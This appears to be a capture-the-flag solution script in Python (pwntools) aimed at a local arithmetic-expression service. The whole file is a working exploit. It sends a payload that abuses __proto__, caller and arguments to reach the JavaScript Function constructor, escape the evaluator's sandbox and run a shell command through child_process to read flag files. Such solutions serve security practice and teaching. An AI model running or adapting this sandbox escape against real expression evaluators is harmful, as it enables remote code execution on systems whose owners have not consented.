from pwn import *
context.log_level = 'critical'
conn = remote('localhost', 5000)
payload = """
getCaller(__proto__)=caller;
getArgs(__proto__)=arguments;
getEvaluate(__proto__)=evaluate;
makeFakeInstr(__proto__,type,value)=arguments[2];
evaluate = getCaller(getCaller);
evaluateArgs = getArgs(evaluate);
expr = evaluateArgs[1];
values = evaluateArgs[2];
fakeMember = makeFakeInstr(evaluate,"IMEMBER","constructor");
fakeIVAR = makeFakeInstr(evaluate,"IVAR","evaluate");
fakeInstrs = [fakeIVAR, fakeMember, fakeMember];
Function = evaluate(fakeInstrs,expr,values);
exploit = Function("console.log(process.mainModule.require('child_process').execSync('cat flag_*').toString())");
exploit();
""".replace('\n', '').strip()
conn.sendlineafter(b"Enter your arithmetic expression (e.g., 1 + 2):\n", payload.encode())
print("Flag: " + conn.recvline().decode())
conn.close()
